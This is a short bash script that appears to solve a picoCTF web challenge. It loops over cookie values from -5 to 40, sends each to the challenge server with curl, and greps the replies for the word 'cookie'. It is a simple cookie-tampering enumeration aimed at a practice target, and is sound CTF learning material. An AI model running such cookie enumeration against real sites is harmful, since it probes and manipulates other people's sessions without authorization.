for i in $(seq -5 40)
do
	echo "Case $i : "
	curl -s http://mercury.picoctf.net:21485/ -H "Cookie: name=$i;" -L | grep -i cookie
done
